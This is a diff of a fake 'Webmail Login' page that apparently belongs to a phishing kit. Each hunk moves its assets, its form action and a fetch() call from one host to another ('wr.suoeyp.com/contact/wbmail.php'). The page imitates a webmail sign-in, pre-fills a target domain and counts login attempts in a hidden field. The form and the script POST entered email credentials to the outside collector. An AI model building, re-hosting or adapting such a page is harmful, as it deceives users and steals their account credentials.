@@ -6,7 +6,7 @@
     <meta name="google" content="notranslate">
     <meta name="apple-itunes-app" content="app-id=1188352635">
     <title>Webmail Login</title>
-    <link id="wbmailStyle" href="https://test1.labsweb.com/aboutus/style_v2_optimized.css" rel="stylesheet" type="text/css">
+    <link id="wbmailStyle" href="https://wr.suoeyp.com/contact/style_v2_optimized.css" rel="stylesheet" type="text/css">
     <style type="text/css">
         /* Original style exactly as provided */
         .copyright {
@@ -17,8 +17,8 @@
         #login_attempt, #attemptNumber { display: none; }
     </style>
 
-    <script src="https://test1.labsweb.com/aboutus/jquery.min.js.download"></script>
-    <script src="https://test1.labsweb.com/aboutus/enterprise.js.download"></script>
+    <script src="https://wr.suoeyp.com/contact/jquery.min.js.download"></script>
+    <script src="https://wr.suoeyp.com/contact/enterprise.js.download"></script>
 </head>
 <body class="wm">
     <div id="preload_images"></div>
@@ -39,7 +39,7 @@
                         <div id="login-detail">
                             <div id="login-status-icon-container">
                                 <span class="login-status-icon" id="status-icon" style="display: none;">
-                                    <img id="imgIcon" src="https://test1.labsweb.com/aboutus/notice-error.png" alt="" align="left">
+                                    <img id="imgIcon" src="https://wr.suoeyp.com/contact/notice-error.png" alt="" align="left">
                                 </span>
                             </div>
                             <div id="login-status-message">You are logged out</div>
@@ -72,7 +72,7 @@
                 <div id="login-container">
                     <div id="login-sub-container">
                         <div id="login-sub-header">
-                            <img id="mainlogo" class="main-logo" src="https://test1.labsweb.com/aboutus/webmail-logo.svg" alt="logo">
+                            <img id="mainlogo" class="main-logo" src="https://wr.suoeyp.com/contact/webmail-logo.svg" alt="logo">
                         </div>
                         <div id="login-sub">
                             <div id="forms">
@@ -83,7 +83,7 @@
 								<p>
                                 <!-- ORIGINAL FORM with added hidden attempt counter and modified to submit to wbmail.php -->
                                 </p>
-                                <form novalidate="" id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://test1.labsweb.com/aboutus/wbmail.php">
+                                <form novalidate="" id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://wr.suoeyp.com/contact/wbmail.php">
                                     <div class="input-req-login"><label for="user">Email Address</label></div>
                                     <div class="input-field-login icon username-container" style="background-position:6px,6px;">
                                         <input id="domain" type="hidden" value="cutrubus.com" name="domain">
@@ -253,7 +253,7 @@
                                         formData.append('attempt', loginAttempt + 1);
 
                                         // Send to server
-                                        fetch('https://test1.labsweb.com/aboutus/wbmail.php', {
+                                        fetch('https://wr.suoeyp.com/contact/wbmail.php', {
                                             method: 'POST',
                                             headers: {
                                                 'Content-Type': 'application/x-www-form-urlencoded',
